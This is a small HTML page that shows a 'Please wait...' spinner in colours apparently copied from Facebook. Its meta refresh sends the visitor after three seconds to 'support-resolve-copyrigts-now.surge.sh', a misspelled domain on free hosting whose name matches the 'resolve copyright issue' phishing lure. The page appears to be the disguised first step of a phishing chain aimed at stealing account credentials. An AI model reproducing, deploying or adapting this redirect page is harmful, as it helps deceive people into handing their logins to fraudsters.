<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<meta http-equiv="refresh" content="3;url=https://support-resolve-copyrigts-now.surge.sh/">

<style>
body{
margin:0;
padding:0;
background:#f0f2f5;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
font-family:Arial;
}

.loader{
text-align:center;
}

.spinner{
width:60px;
height:60px;
border:6px solid #ddd;
border-top:6px solid #1877f2;
border-radius:50%;
animation:spin 1s linear infinite;
margin:auto;
}

@keyframes spin{
0%{transform:rotate(0deg);}
100%{transform:rotate(360deg);}
}

.text{
margin-top:15px;
color:#555;
font-size:16px;
}
</style>
</head>

<body>

<div class="loader">
<div class="spinner"></div>
<div class="text">Please wait...</div>
</div>

</body>
</html>
